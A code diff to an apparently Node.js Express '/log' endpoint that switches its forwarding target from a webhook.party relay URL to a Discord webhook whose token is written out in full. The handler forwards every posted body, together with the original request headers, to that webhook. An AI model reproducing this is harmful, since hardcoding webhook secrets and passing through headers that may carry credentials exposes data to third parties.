@@ -26,7 +26,7 @@ app.post('/log', async (req, res) => {
 
   // Optionally forward to the original webhook
   try {
-    await axios.post('https://l.webhook.party/hook/1xAhO58c9OQ9HvdARJ1ALxCECIgPSUU0MSzWxwJHjb8lgTM1zXk6E5MEsCno97549o5XTqVfCX4i4mtuSEBHEwWvY6yAvQuNLHIr9agO9ituVxjPkVR8EdE7Uj5LP0aEeYSqhmRm40fte65mochwUnjyDak72j17rn9Ewud%2BIHzaPLqi6XHDP8%2B%2F7UO%2FA168iISyCBDgvyFCBHn%2FQiSdoBQk0LNJgtBY1HL7gtT2zXgIRkJaZhGORwpI8XAR2YOZyxw4mY2qs2XwPZ4wcfvhHDh3bQKU8dAPtYnEcMbjMUIjm9%2FWd64G2qExLYU66SiAV%2BY5mu4hGD4zGKl2sLuZzOl%2BZbH%2BUI6Wr1ol85VWexSgQGNpF3x0QCvGtziaH4WEQarqZvQYH2A%3D/66SBmIIo8EOCGU6b', req.body, {
+    await axios.post('https://discord.com/api/webhooks/1397128931567603742/ICteuf__9KOTzicVn7lysg7AFbe16q7o2lebabbArWxq-t9bHrfPCbbiVY3zLZTJI9xT', req.body, {
       headers: req.headers
     });
     console.log('Forwarded to original webhook');
